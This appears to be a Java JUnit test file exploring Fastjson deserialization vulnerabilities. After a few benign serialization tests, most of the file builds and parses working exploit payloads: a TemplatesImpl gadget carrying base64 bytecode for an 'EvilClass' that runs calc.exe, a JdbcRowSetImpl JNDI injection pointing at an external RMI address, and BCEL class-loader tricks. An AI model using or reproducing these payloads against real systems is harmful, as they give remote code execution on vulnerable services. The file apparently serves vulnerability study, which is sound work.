package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.junit.Test;

import javax.xml.transform.TransformerConfigurationException;
import java.io.IOException;
import java.io.StringWriter;

public class TestFastjson {
    @Test
    public void test1() {
        User user = new User("test", 1);
        String jsonString = JSON.toJSONString(user);
        System.out.println(jsonString);
    }
    @Test
    public void test2() {
        User user = new User("test", 1);
        String jsonString = JSON.toJSONString(user, SerializerFeature.PrettyFormat, SerializerFeature.WriteClassName);
        System.out.println(jsonString);
    }

    @Test
    public void test3() {
        StringWriter stringWriter = new StringWriter();
        User user = new User("test", 1);
        JSON.writeJSONString(stringWriter, user);
        System.out.println(stringWriter.toString());
    }
    @Test
    public void test4() {
       String test="{\"age\":1,\"name\":\"test\"}";
        User user = JSON.parseObject(test, User.class);
        System.out.println(user);
    }
    @Test
    public void test5() {
        String test="{\"age\":1,\"name\":\"test\"}";
//        User user = JSON.parseObject(test, User.class, Feature.SupportAutoType);
//        System.out.println(user);
    }
    @Test
    public void test6(){
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("@type","com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");

        jsonObject.put("_name","EvilClass");
        jsonObject.put("_bytecodes","yv66vgAAADQAGQEADEV2aWxUcmFuc2xldAcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAoACwoACQAMAQAIY2FsYy5leGUIAA4BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAQABEKAAkAEgEABjxpbml0PgwAFAAGCgAEABUBAApTb3VyY2VGaWxlAQARRXZpbFRyYW5zbGV0LmphdmEAIQACAAQAAAAAAAIACAAFAAYAAQAHAAAAFgACAAAAAAAKuAANEg+2ABNXsQAAAAAAAQAUAAYAAQAHAAAAEQABAAEAAAAFKrcAFrEAAAAAAAEAFwAAAAIAGA==");
        jsonObject.put("_tfactory","{}");
        System.out.println(jsonObject.toJSONString());
//        JSON.parseObject(jsonObject.toJSONString(), Feature.SupportAutoType);
    }
    @Test
    public void test7() throws TransformerConfigurationException {
        String test="{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAGQEADEV2aWxUcmFuc2xldAcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAoACwoACQAMAQAIY2FsYy5leGUIAA4BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAQABEKAAkAEgEABjxpbml0PgwAFAAGCgAEABUBAApTb3VyY2VGaWxlAQARRXZpbFRyYW5zbGV0LmphdmEAIQACAAQAAAAAAAIACAAFAAYAAQAHAAAAFgACAAAAAAAKuAANEg+2ABNXsQAAAAAAAQAUAAYAAQAHAAAAEQABAAEAAAAFKrcAFrEAAAAAAAEAFwAAAAIAGA==\"],\"_name\":\"EvilClass\",\"_tfactory\":{},\"_outputProperties\": {}}";
        System.out.println(test);
        JSON.parseObject(test, Object.class,Feature.SupportNonPublicField);
//        System.out.println(o);
    }
    @Test
    public void test8(){
        String test="{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAGQEADEV2aWxUcmFuc2xldAcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAoACwoACQAMAQAIY2FsYy5leGUIAA4BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAQABEKAAkAEgEABjxpbml0PgwAFAAGCgAEABUBAApTb3VyY2VGaWxlAQARRXZpbFRyYW5zbGV0LmphdmEAIQACAAQAAAAAAAIACAAFAAYAAQAHAAAAFgACAAAAAAAKuAANEg+2ABNXsQAAAAAAAQAUAAYAAQAHAAAAEQABAAEAAAAFKrcAFrEAAAAAAAEAFwAAAAIAGA==\"],'_name':'test','_tfactory':{},\"_outputProperties\":{}}";
        Object o = JSON.parseObject(test,Object.class);
        System.out.println(o);
    }

    @Test
    public void test9()   {
        String test="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://166.108.225.228:1099/tiabzl\",\"autoCommit\":true}" ;
        System.out.println(test);
        Object o = JSON.parseObject(test, Object.class);
    }
    @Test
    public void test10() throws IOException, ClassNotFoundException {
        JavaClass javaClass = Repository.lookupClass(TestFastjson.class);
        String encode = Utility.encode(javaClass.getBytes(), true);
        System.out.println(encode);

        new ClassLoader().loadClass("$$BCEL$$" + encode);
//        Object o = new ClassLoader().loadClass("$$BCEL$$" + encode).newInstance();
    }

}
